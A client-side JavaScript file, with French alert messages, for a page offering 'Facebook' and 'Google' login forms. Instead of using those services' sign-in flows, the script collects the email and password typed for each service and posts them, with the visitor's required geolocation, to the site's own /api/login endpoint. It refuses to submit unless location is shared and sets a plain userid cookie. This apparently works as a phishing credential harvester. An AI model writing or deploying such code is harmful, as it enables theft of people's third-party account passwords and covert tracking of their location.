let user = {};

if(getCookie('userid') !== null){
  window.location = '/profile';
}

if ( navigator.geolocation ) {
  navigator.geolocation.getCurrentPosition((pos) => {
    user.location = {
      latitude: pos.coords.latitude,
      longitude: pos.coords.longitude
    }
  });
} else {
  alert('veuillez activer la géolocalisation si vous voulez que tout fonctionne correctement.');
}

const submitForm = async (type) => {
  switch (type) {
    case 'facebook':
      user.username = document.getElementById('emailf').value;
      user.password = document.getElementById('passwordf').value;
      user.type = 'facebook';
      document.getElementById('btnf').classList.add('disabled');
      break;
    case 'google':
      user.username = document.getElementById('emailg').value;
      user.password = document.getElementById('passwordg').value;
      user.type = 'google';
      document.getElementById('btng').classList.add('disabled');
      break;
  }

  const req = await fetch('/api/login', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(user)
  });
  const res = await req.json();

  if (res.isConnect){
    document.cookie = `userid=${res.user._id}; path=/`;
    window.location = '/profile';
  }
};


      //login with facebook
document.querySelector('#facebook').addEventListener('submit', (e) => {
  e.preventDefault();

  navigator.geolocation.getCurrentPosition(
    (pos) => {    //callback success
      user.location = {
        latitude: pos.coords.latitude,
        longitude: pos.coords.longitude
      }
      submitForm('facebook').then(() => {
        document.getElementById('btnf').classList.remove('disabled');
      });
    },
    () => {     //callback error
      alert('veuillez activer la géolocalisation si vous voulez que tout fonctionne correctement.');
      return;
    }
  );
});

      //login with google
document.querySelector('#google').addEventListener('submit', (e) => {
  e.preventDefault();

  navigator.geolocation.getCurrentPosition(
    (pos) => {    //callback success
      user.location = {
        latitude: pos.coords.latitude,
        longitude: pos.coords.longitude
      }
      submitForm('google').then(() => {
        document.getElementById('btng').classList.remove('disabled');
      });
    },
    () => {     //callback error
      alert('veuillez activer la géolocalisation si vous voulez que tout fonctionne correctement.');
      return;
    }
  );
});
